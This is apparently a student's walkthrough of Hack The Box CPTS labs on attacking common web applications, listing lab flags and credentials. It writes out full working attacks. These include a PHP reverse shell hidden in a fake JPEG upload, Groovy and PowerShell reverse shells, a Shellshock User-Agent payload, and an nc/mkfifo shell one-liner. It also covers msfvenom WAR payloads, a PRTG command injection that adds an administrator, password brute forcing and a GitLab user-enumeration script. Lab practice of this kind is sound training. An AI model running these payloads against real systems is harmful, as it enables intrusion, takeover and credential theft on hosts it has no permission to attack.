---
title: CPTS labs - 23 Attacking Common Applications
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 23 Attacking Common Applications

Module: [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)

## Setting the Stage

vHosts needed for these questions:

- `app.inlanefreight.local`
- `dev.inlanefreight.local`
- `drupal-dev.inlanefreight.local`
- `drupal-qa.inlanefreight.local`
- `drupal-acc.inlanefreight.local`
- `drupal.inlanefreight.local`
- `blog.inlanefreight.local`

**Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)**

First, we add the scope list to our /etc/hosts file. Then we save the scope list to the file scope_list. Then we run

```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
```

We will see a lot of open ports at 80. Now we will use eyewitness:

```
eyewitness --web -f scope_list -d ~/borrar/eye
```

Results: ew.db


**What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)**

```
cat scope_list | aquatone -out ~/borrar/aquatone -screenshot-timeout 1000
```

Results: Pages by Similarity


## Content Management Systems (CMS)



**vHosts needed for these questions:**
**blog.inlanefreight.local**

**Enumerate the host and find a flag.txt flag in an accessible directory.**

Browse to http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt

Results: 0ptions_ind3xeS_ftw!


Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

```
curl -s http://blog.inlanefreight.local/?p=1 | grep plugin 
```

Then browse to http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/ and a blank page is returned. Then try http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt

Results: WP Sitemap Page

**Find the version number of this plugin. (i.e., 4.5.2)**

Results: 1.6.4


**Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?**

```
RUBYOPT='-rlogger' wpscan --url http://blog.inlanefreight.local  -eu   
```

Results: doug


**Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.**

```
RUBYOPT='-rlogger' wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local 
```

Output:

```
[!] Valid Combinations Found:
 | Username: doug, Password: jessica1
```

Results: jessica1

**Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.**

When login into the application a modal is displaying prompting us to confirm our email webadmin@inlanefreight.local

Results: webadmin

**Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.**

We intercept the request for uploading an image and we upload a pentestmonkey reverse shell:

```html
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------11335875238744126981755578650
Content-Length: 3462
Origin: http://blog.inlanefreight.local
Connection: keep-alive
Referer: http://blog.inlanefreight.local/?p=1
Cookie: wordpress_41b86925a9649ab021037fd033e676e4=doug%7C1738678857%7Crvhq8aaCVwCyCHKdisujDmB95zK2vWaPrRIhpn6RY1E%7Ce43a022a4a0c1ae3b4e237eb71b27ab3d6c0d037f344c0cd7a79eddbe5c823d3; wordpress_test_cookie=WP+Cookie+check; wpdiscuz_hide_bubble_hint=1; wp-settings-time-2=1738506386; comment_author_email_41b86925a9649ab021037fd033e676e4=doug.douglas@inlanefreight.local; comment_author_41b86925a9649ab021037fd033e676e4=Doug%20Douglas; wordpress_logged_in_41b86925a9649ab021037fd033e676e4=doug%7C1738678857%7Crvhq8aaCVwCyCHKdisujDmB95zK2vWaPrRIhpn6RY1E%7C69b9802a59cf0d79179d2c0a8cde61c18e4991196c4dc68669f918f78586cce5

-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="action"

wmuUploadFiles
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="wmu_nonce"

2bcdf6e4cb
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="wmu_files[0]"; filename="mala.php"
Content-Type: application/octect-stream

ÿØÿà JFIF  ` `  ÿþ ;		
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.145';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="postId"

1
-----------------------------11335875238744126981755578650--
```

The server return the target location of the upload. Now in our kali attacker machine:

```
nc -lnvp 1234
```

And we browse to http://blog.inlanefreight.local/wp-content/uploads/2025/02/mala-1738507185.1412.php to receive the reverse shell. Now, from the terminal we browse around and print out the flag:

```
cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
```

Results: l00k_ma_unAuth_rc3!


**vHosts needed for these questions:**
**app.inlanefreight.local**

**Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)**

```
droopescan scan joomla --url http://$target/
curl http://app.inlanefreight.local/administrator/manifests/files/joomla.xml

```

Results:  3.10.0


**Find the password for the admin user on http://app.inlanefreight.local**

```
sudo python3 joomla-brute.py -u http://$target -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

Results:  turnkey


vHosts needed for these questions:
dev.inlanefreight.local

Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

```
sudo python3 joomla-brute.py -u http://$target -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
# Output: 
# admin:admin

# In my case I entered as admin:admin and modify the index.php template to include a pentesmonkey reverse shell. After that:
cat /var/www/html/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
```

Result: j00mla_c0re_d1rtrav3rsal!

**vHosts needed for these questions:**
**drupal.inlanefreight.local**
**drupal-qa.inlanefreight.local**

**Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local**

```
 curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
# Output
# Drupal 7.30, 2014-07-24
```

Results: 7.30

**Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.**

```
# Go to http://drupal.inlanefreight.local/admin/modules
# Find PHP Filter and enable it
# Next, we could go to Content --> Add content and create a `Basic page`.
# We will paste a pentesmonkey reverse shell and will have a listener ready in our kali machine
# After getting a shell, print the flag:
cat /var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt

```

Resutls: DrUp@l_drUp@l_3veryWh3Re!



## Servlet Containers/Software Development


vHosts needed for these questions:

- `app-dev.inlanefreight.local`
- `web01.inlanefreight.local`

**What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?**

```
curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat 
```

Results: 10.0.10


**What role does the admin user have in the configuration example?**

See the example provided by HTB. 

Results: admin-gui


vHosts needed for these questions:

- `web01.inlanefreight.local`

**Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?**

Run the script [provided in the notes](tomcat-pentesting.md) for brute force user:password:

```
 python tomforce.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt  
```

Results: tomcat

**What is the password?**

Results: root


**Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt**

```
# 1.Generate the WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

# 2.  Start a listener in your attacking machine:
nc -lnvp 4443

# 3. Upload the file backup.war in the section "WAR file to deploy". Then click on Deploy.

# Find the flag
find / -name tomcat_flag.txt 2>/dev/null

# Cat it
cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
```

Results: t0mcat_rc3_ftw!


vHosts needed for these questions:

- `jenkins.inlanefreight.local`

**Authenticate to (ACADEMY-ATCKAPPS-APP02) with user "admin" and password "admin". Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.**

See the footer.

Results: 2.303.1


vHosts needed for these questions:

- `jenkins.inlanefreight.local`

**Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory**

Access to jenkins.inlanefreight.local with admin:admin. Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console located under "Manage Jenkins" tab.

Snippet code for a reverse shell:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.147/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![](img/jenkins_00.png)

And have a listener in our attacking machine.

```bash
nc -lnvp 1234      
```

Now we cat the flag: 

```
cat var/lib/jenkins3/flag.txt
```

Results: f33ling_gr00000vy!


## Infrastructure/Network Monitoring Tools


**Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).**

We enumerate the open ports: 

```
sudo nmap $ip -sC -sV --top-ports 10000
```

After noticing port 8000 with Splunk service in it, we access it. Note that we will be accessing with HTTPS. See the title of the site.
Results: 8.2.2


**Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.**

Clone the tool reverse_shell_splunk

```
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
```

Modify the one-liner:

```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.147',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Create a tarball or `.spl` file.

```shell-session
tar -cvzf updater.tar.gz reverse_shell_splunk/
```

Set a listener on the attacking machine:

```
nc -lnvp 1234
```

In the browser go to Manage apps, upload app, and upload your updater.tar.gz. Upon upload, the shell will be triggered. Now print the flag.

```
dir c:\loot
type c:\loot\flag.txt
```

Results: l00k_ma_no_AutH!


**What version of PRTG is running on the target?**

See the footer of http://10.129.48.71:8080/. Also:

```shell-session
curl -s http://$target:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

Results: 18.1.37.13946


**Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.**

**1.** Access to the application at http://10.129.41.233:8080  with `prtgadmin:Password123`

**2.** To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.

**3.** Next, click on Add new notification.

**4.** Give the notification a name and scroll down and tick the box next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1 from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

**5.** After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.

**5.** Click the Test button to run our notification and execute the command to add a local admin user. After clicking Test we will get a pop-up that says EXE notification is queued up. 

**6.** Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. 

**7.** Use crackmapexec / WinRM / RDP / EvilWinRm / impacket toolkit such as wmiexec.py or psexec.py to confirm local admin access.


## Customer Service Mgmt & Configuration Management

vHosts needed for these questions:

- `support.inlanefreight.local`

**Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson.**

Access to `support.inlanefreight.local` with creds facilitated in the lesson: 

```
user: kevin@inlanefreight.local
password: Fish1ng_s3ason!
```

Login page is typically located at: http://$target/scp/login.php

Then, find the ticket that contains a conversation about a VPN password being reset
(the ticket is a little bit hidden, use the search feature):

Results: Inlane_welcome!


vHosts needed for these questions: `gitlab.inlanefreight.local`.

**Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?**

We access http://gitlab.inlanefreight.local, register an user and browse to http://gitlab.inlanefreight.local:8081/help

Results: 13.10.2

**Find the PostgreSQL database password in the example project.**

Browse to http://gitlab.inlanefreight.local:8081/explore

Then to http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev

And finally to http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev/-/blob/master/phpunit_pgsql.xml

Result: postgres



**Find another valid user on the target GitLab instance.**

We will run the following script:

```
# Exploit Title: GitLab Community Edition (CE) 13.10.3 - User Enumeration
# Date: 4/29/2021
# Exploit Author: @4D0niiS [https://github.com/4D0niiS]
# Vendor Homepage: https://gitlab.com/
# Version: 13.10.3
# Tested on: Kali Linux 2021.1

#!/bin/bash

#Colors
RED='\033[38;5;196m'
GREEN='\e[38;5;47m'
NC='\033[0m'
BOLD='\e[1m'
PINK='\e[38;5;198m'
Italic='\e[3m'
BBlue='\e[44m'
YELLOW='\033[0;33m'

clear
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "  			             ${BBlue}${BOLD}GitLab User Enumeration Script${NC}"
echo -e "   	    			             ${BOLD}Version 1.0${NC}\n"
echo -e "${BOLD}${PINK}Description: ${NC}It prints out the usernames that exist in your victim's GitLab CE instance\n"
echo -e "${BOLD}${PINK}Disclaimer: ${NC}${Italic}Do not run this script against ${BOLD}GitLab.com!${NC}${Italic} Also keep in mind that this PoC is meant only"
echo -e "for educational purpose and ethical use. Running it against systems that you do not own or have the"
echo -e "right permission is totally on your own risk.\n${NC}"
echo -e "${BOLD}${PINK}Author:${NC}${BOLD} @4DoniiS${NC}${Italic} [https://github.com/4D0niiS]${NC}"
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo ""
echo ""



# Usage
usage() {
echo -e "${YELLOW}usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist>${NC}\n"

echo -e "${Italic}PARAMETERS:${NC}"
echo -e "-------------"
echo -e "-u/--url	The URL of your victim's GitLab instance"
echo -e "--userlist	Path to a username wordlist file (one per line)"
echo -e "-h/--help	Show this help message and exit"
echo -e "\n"
echo -e "${Italic}Example:${NC}"
echo -e "-------------"
echo -e "./gitlab_user_enum.sh --url http://gitlab.local/ --userlist /home/user/usernames.txt"
}

#check for params
args= ("$@")
URL=""
user_list=""

for (( i=0; i < $#; i++))
{
	case ${args[$i]} in
	--url | -u)
	#GitLab's URL
	URL=${args[$((i+1))]}
	;;
	--userlist)
	#Username wordlist
	user_list=${args[$((i+1))]}
	;;
	-h | --help | "")
	#Help Menu
	usage
	exit 0
	;;
	esac
}


## checking the mandatory parameter (URL)
if [ -z "$URL" ]
then
    usage
    echo ""
    echo -e "${RED}${BOLD}The URL of your GitLab target (--url) is missing. ${NC}"
    exit 0
fi


# User Enumeration Function
enumeration(){

while IFS= read -r line
do
	echo "LOOP"
	HTTP_Code=$( curl -s -o /dev/null -w "%{http_code}" $URL/$line)
	echo $HTTP_Code
	#echo "\n"
	if [ $HTTP_Code -eq 200 ]
	then
 	 echo -e "${GREEN}${BOLD}[+]${NC} The username ${GREEN}${BOLD}$line ${NC}exists!"
	#check the connection
	elif [ $HTTP_Code -eq 000 ]
	then
	 echo -e "${BOLD}${RED}[!]${NC} The target is unreachable. Please make sure that you entered target's URL correctly and you have connection with it!"
	 exit 0
	fi

done < "$user_list"

}



# Main
enumeration
```

Run:

```
./enumuser2.sh -u http://gitlab.inlanefreight.local:8081/ --userlist /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt  | grep [+]
```

Output:

```
[+] The username DEMO exists!
```

Results: DEMO

If we use a different wordlist we will obtain some more users:

```
GitLab User Enumeration in python
[+] The username bob exists!
[+] The username root exists!
[+] The username demo exists!
[+] The username public exists!
[+] The username help exists!
...[SNIP]...
```


**Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.**

As we know that Gitlab [13.10.2](https://www.exploit-db.com/exploits/49951) is vulnerable, we will download the exploit 49951.py.

Then, start a listener:

```
nc -lnvp 1234
```

Running the script:

```
python3.11 49951.py -u lala -p lalala123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.147 1234 >/tmp/f'   -t http://gitlab.inlanefreight.local:8081
```

Now, from the shell:

```
ls -la
cat flag_gitlab.txt
```

Results: s3cure_y0ur_Rep0s!



## Common Gateway Interfaces

**After running the URL Encoded 'whoami' payload, what user is tomcat running as?**

First we enumerate:

```
nmap 10.129.205.30 -Pn -sC -sV -p- --open
```

Output: 

```
Nmap scan report for 10.129.205.30
Host is up (0.27s latency).
Not shown: 64816 closed tcp ports (reset), 705 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
|   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
|_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http          Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 5m29s
| smb2-time: 
|   date: 2025-02-07T21:10:47
|_  start_date: N/A

```

We access the tomcat page http://10.129.205.30:8080/ and check version: # 9.0.17.

This version is potentially vulnerable to `CVE-2019-0232`. If the `enableCmdLineArguments` feature enabled, RCE is possible. 

Now, we enumerate potential vulnerable endpoints:

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
```

We obtain ẁelcome. Now we can trigger the RCE: http://10.129.205.30:8080/cgi/welcome.bat?&dir

![](img/cgi.png)

Now, 

```
http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

Results: feldspar\omen


**Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.**

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Output:  /access.cgi 

Now we can do via curl o via Burpsuite:

```
GET /cgi-bin/access.cgi HTTP/1.1
Host: 10.129.205.27
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.78/1234 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 12 Oct 2020 09:32:54 GMT
If-None-Match: "2aa6-5b175fba24dbe-gzip"
```

In the reverse shell

```
ls -la
cat flag.txt
```

Results: Sh3ll_Sh0cK_123



## Thick Client Applications


**Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.**

We connect to the machine via RDP:

```
xfreerdp /v:10.129.117.65 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore
```

We open the tool `ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) located at c:\Tools\ProcessMonitor\Procmon64.exe. We set the filter "Process name" contains Restart-OracleService

![](img/thick_00.png)

and Start the capture.


We start the C:\Apps\Restart-OracleService.exe program

```
cd C:\Apps\
.\Restart-OracleService.exe 
```

We can see in the process monitor that the temp folder is being written with some content. 
![](img/thick_01.png)

We browse to the Temp folder C:\Users\cybervaca\AppData\Local\Temp and retrieve the .bat file

![](img/thick_02.png)

When opening witht the Notepad, we observe some lines removing some scripts and the executable. We can remove the del lines and execute again the program:

![](img/thick_03.png)

```
.\Restart-OracleService.exe 
```

Now, if we browse to c:\ProgramData we will see the new files monta.ps1, oracle.txt:

![](img/thick_04.png)

We can read the script:

```powershell
cat C:\programdata\monta.ps1
```

```powershell
$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
```

This script simply reads the contents of the `oracle.txt` file and decodes it to the `restart-service.exe` executable. Running this script gives us a final executable that we can further analyze.

![](img/thick_05.png)

Now, we will start procmon64, and modify the filter to catch those process name that contains restart-service string. And we launch the restart-service.

We will  start `x64dbg`, navigate to `Options` -> `Preferences`, and uncheck everything except `Exit Breakpoint`: By unchecking the other options, the debugging will start directly from the application's exit point, and we will avoid going through any `dll` files that are loaded before the app starts.

Then, we can select `file` -> `open` and select the `restart-service.exe` to import it and start the debugging. Once imported, we right click inside the `CPU` view and `Follow in Memory Map`.

![](img/thick_06.png)

We will double click on the first line:

![](img/thick_07.png)

If we double-click on it, we will see the magic bytes `MZ` in the `ASCII` column that indicates that the file is a [DOS MZ executable](https://en.wikipedia.org/wiki/DOS_MZ_executable). Memory-mapped files allow applications to access large files without having to read or write the entire file into memory at once. Instead, the file is mapped to a region of memory that the application can read and write as if it were a regular buffer in memory. This could be a place to potentially look for hardcoded credentials.

![](img/thick_08.png)

Let's return to the Memory Map pane, then export the newly discovered mapped item from memory to a dump file by right-clicking on the address and selecting `Dump Memory to File`.

![](img/thick_09.png)

We run Strings and notice that it  contains a binary:

```
.\strings.exe C:\Users\cybervaca\Desktop\restart-service_0000000000A50000.bin
```

![](img/thick_10.png)

If we open it with dnspy, we will be able to see some creds:

![](img/thick_11.png)

Results: svc_oracle:#oracle_s3rV1c3!2010

```

```


```

```


```

```

## Miscellaneous Applications


## Skills Assessments

### Attacking Common Applications - Skills Assessment I

During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.

**What vulnerable application is running?**

We enumerate the services and ports:

```
nmap 10.129.201.89 -Pn -sC -sV -p- --open
```

We see apache tomcat. After accessing the web we can see that is running under version 9.0.0.M1

Results: Tomcat 


**What port is this application running on?**

Results: 8080


**What version of the application is in use?**

 9.0.0.M1


**Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.**


```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.201.89:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
:: Progress: [4614/4614] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:18] :: Errors: 0 ::

```


```
http://10.129.201.89:8080/cgi/cmd.bat?&dir+C:\Users\Administrator\Desktop
```


I used metasploit:

```
msfconsole -q
search CVE-2019-0232
use 0
set RHOSTS 10.129.73.151
set LHOST 10.10.14.147
set ForceExploit true
set targeturi /cgi/cmd.bat
run
```

In the meterpreter session now you can type the flag:

```
type c:\Users\Administrator\Desktop\flag.txt
```

Results: f55763d31a8f63ec935abd07aee5d3d0



